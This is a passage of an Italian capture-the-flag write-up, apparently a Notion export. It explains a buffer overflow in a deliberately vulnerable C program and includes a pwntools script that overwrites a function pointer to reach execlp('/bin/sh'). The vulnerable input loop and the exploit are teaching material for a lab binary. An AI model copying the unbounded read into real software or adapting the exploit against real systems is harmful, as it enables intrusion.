+    while ((c = getchar()) != &#x27;\n&#x27;)
+        user.favourite_lang[i++] = c;
+    
+    if(!strncmp(user.favourite_lang, &quot;java&quot;, 4)) {
+        printf(&quot;Just another Java noob...\n&quot;);
+    }
+    else if (!strncmp(user.favourite_lang, &quot;python&quot;, 6)) {
+        user.call = python;
+    }
+    else if (!strncmp(user.favourite_lang, &quot;bash&quot;, 4)) {
+        user.call = bash;
+    }
+    else {
+        user.call = nothing;
+    }
+    if(user.call) user.call();
+    return 0;
+}</code></pre><p id="16145ec3-0d37-8127-ba44-e92a1f54463a" class="">
+</p><hr id="16145ec3-0d37-8132-893b-d9baa2bb22ef"/><div id="16145ec3-0d37-81a5-b76d-ca4a7d015d67" class="column-list"><div id="16145ec3-0d37-8104-8790-f8256650c773" style="width:50%" class="column"><p id="16145ec3-0d37-81bb-bc2c-c004ded07d5d" class="">Lo scopo di questo esercizio è aprire una shell, ossia eseguire il comando <code>/bin/sh</code>. <br/>Per farlo dobbiamo osservare la funzione<br/><code>void bash()</code>.<br/><br/>È presente una riga che fa esattamente quello che ci serve, ossia <br/><code>execlp(&quot;/bin/sh&quot;, &quot;/bin/sh&quot;, NULL);</code>.<br/>Come si può vedere però, questa riga non verrà mai eseguita in quanto c’è un <br/><code>return</code>che viene eseguito prima.<br/>Dobbiamo quindi trovare un modo di saltare alla riga corretta, sfruttando il modo in cui il programma prende l’input.<br/><br/></p><p id="16145ec3-0d37-8194-8740-d62ea77edbc9" class="">
+</p><p id="16145ec3-0d37-81a9-8156-c70ec4671309" class="">
+</p></div><div id="16145ec3-0d37-81d2-ad2f-f7c7a0b062b4" style="width:50%" class="column"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="16145ec3-0d37-814a-b693-ca59ff984e9d" class="code"><code class="language-C">void bash()
+{
+    printf(&quot;Opening bash shell...\n&quot;);
+    sleep(3);
+    printf(&quot;are you sure you don&#x27;t prefer java?\n&quot;);
+    if(rand() != 328347) return; //sempre vero
+    // if only there was a way to jump here...
+    execlp(&quot;/bin/sh&quot;, &quot;/bin/sh&quot;, NULL);
+</code></pre></div></div><p id="16145ec3-0d37-81d5-8214-da57fd8c8771" class="">In questo esercizio è presente la struct:</p><div id="16145ec3-0d37-81e3-9862-f0e18e2a5bbf" class="column-list"><div id="16145ec3-0d37-81a6-8112-fc7dce0a4b36" style="width:29.166666666666664%" class="column"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="16145ec3-0d37-81b2-92eb-c7421c9cefe3" class="code"><code class="language-C">struct programmer_t
+{
+    char favourite_lang[32];
+    void (*call)(); 
+};</code></pre><p id="16145ec3-0d37-81ee-a0c6-f6b583768c85" class="">
+</p><p id="16145ec3-0d37-819e-ab06-d80ce24c8b1e" class="">
+</p></div><div id="16145ec3-0d37-81b8-9c23-f4a3ab050a49" style="width:24.999999999999993%" class="column"><figure id="16145ec3-0d37-8178-815d-c558f992557d" class="image" style="text-align:left"><a href="Pwn%2016145ec30d3781f3bdc8c3f56e726f69/Untitled%204.png"><img style="width:240px" src="Pwn%2016145ec30d3781f3bdc8c3f56e726f69/Untitled%204.png"/></a></figure><p id="16145ec3-0d37-81fe-9be6-e505f333b653" class="">
+</p></div><div id="16145ec3-0d37-810b-af69-e82a19bcb0e0" style="width:45.83333333333335%" class="column"><p id="16145ec3-0d37-81a0-a72f-c5b11af6b59e" class=""><code>void (*call)();</code> trasforma la variabile in una funzione e la chiama.<br/>Nel codice, <br/><code><a href="http://user.call">user.call</a></code><code>=...</code> viene usato per trasformare <code>...</code> in una funzione.<br/><br/>Potremmo fare buffer overflow della variabile <br/><code>favourite_lang</code> in modo da sovrascrivere  <code>void (*call)();</code> con un indirizzo a nostro piacimento</p><p id="16145ec3-0d37-81e6-a01e-db9bb795c7a2" class="">
+</p><p id="16145ec3-0d37-815c-98a9-ddf02f1cf26b" class="">
+</p></div></div><p id="16145ec3-0d37-81f1-898f-c62f97ca3810" class="">
+</p><div id="16145ec3-0d37-81dd-a570-c65e563ef4ae" class="column-list"><div id="16145ec3-0d37-81c1-adc2-f32547bc44af" style="width:50%" class="column"><p id="16145ec3-0d37-818d-903b-d7af4ca2b058" class=""><br/>Osservando il main possiamo notare che se <br/><code>favorite_lang</code> è uguale a python, bash o nothing viene chiamata la corrispettiva funzione; per java invece non viene fatto nulla.</p><p id="16145ec3-0d37-8197-adff-f0ff1aabe675" class=""><br/>Se il programma non legge “java” nei primi 4 caratteri inseriti, andrà quindi a sovrascrivere la variabile <br/><code>call</code> (dentro la struct <code>user</code>).<br/>Questo avviene dopo la raccolta dell’input quindi renderebbe vano il nostro overflow realizzato con tanta cura 😢.<br/><br/></p><p id="16145ec3-0d37-81d4-ac56-f8acae826ce2" class="">Per ovviare al problema dobbiamo assicurarci che le prime 4 lettere dell’input da noi inserito siano “java”.<br/>Il resto delle lettere potranno essere casuali, basta che riempiano il buffer.<br/>Infine, una volta riempito il buffer, dobbiamo scrivere l’indirizzo di memoria della riga a cui vogliamo saltare.<br/></p><p id="16145ec3-0d37-81a2-a786-c404f546c176" class="">
+</p></div><div id="16145ec3-0d37-81b4-b1c4-d15aef06331a" style="width:50%" class="column"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="16145ec3-0d37-817f-94b5-ff10bfd2f20c" class="code"><code class="language-C" style="white-space:pre-wrap;word-break:break-all">int main(int argc, char** argv)
+{
+    programmer_t user = {0};
+    
+    printf(&quot;Enter your favourite programming language: &quot;);
+    fflush(stdout);
+    int i = 0;
+    char c;
+    while ((c = getchar()) != &#x27;\n&#x27;)
+        user.favourite_lang[i++] = c;
+    
+    if(!strncmp(user.favourite_lang, &quot;java&quot;, 4)) {
+        printf(&quot;Just another Java noob...\n&quot;);
+    }
+    else if (!strncmp(user.favourite_lang, &quot;python&quot;, 6)) {
+        user.call = python;
+    }
+    else if (!strncmp(user.favourite_lang, &quot;bash&quot;, 4)) {
+        user.call = bash;
+    }
+    else {
+        user.call = nothing;
+    }
+    if(user.call) user.call();
+    return 0;
+}</code></pre></div></div><p id="16145ec3-0d37-8127-ae67-fd3096563841" class="">
+</p><p id="16145ec3-0d37-818a-9d5a-fdb3737a3b72" class="">
+</p><p id="16145ec3-0d37-812e-b624-fe1bb05ca1e3" class="">Per risolvere il problema conviene realizzare uno script python, tecnicamente è sufficiente scrivere le giuste lettere su un terminale però questa volta dovremmo scrivere un indirizzo di memoria e la libreria <code>pwn</code> per python ha un comando comodissimo per farlo.</p><p id="16145ec3-0d37-8179-8734-d0af62f493b1" class="">L’indirizzo di memoria infatti viene mostrato in esadecimale da ghidra/ida/gdb, la funzione <code>pwn.p64</code> ci consente di convertirlo automaticamente in byte.</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="16145ec3-0d37-8143-986e-d2665189201f" class="code"><code class="language-Python">import pwn
+
+p = pwn.process(&quot;./java&quot;)
+p.sendline(
+	b&quot;java&quot; + #condizione iniziale per non avere &quot;user.call&quot; sovrascritto 
+	b&quot;A&quot;*28 + # byte di buffer overflow
+            # (devono essere uguali alla dimensione del buffer (32) =&gt; java (4 caratteri) + 28 volte &quot;A&quot;)
+	pwn.p64(0x4007a2) #indirizzo trovato con GDB o GHIDRA (vedi sotto) [*1]
+)
+
+p.interactive()</code></pre><p id="16145ec3-0d37-815a-b10a-e7a42e8add54" class=""><strong>[*1] </strong>L’indirizzo <code>0x4007a2</code> è l’indirizzo della funzione <code>execlp</code> (nella funzione  <mark class="highlight-blue"><code>void</code></mark><code> bash</code><mark class="highlight-gray"><code>()</code></mark>) ed è stato ottenuto decompilando il programma <em>java</em> usando GDB (Ghidra e IDA vanno altrettanto bene).</p><p id="16145ec3-0d37-81fa-ae2e-c27c8ea921c7" class="">
+</p></div></article><span class="sans" style="font-size:14px;padding-top:2em"></span></body></html>
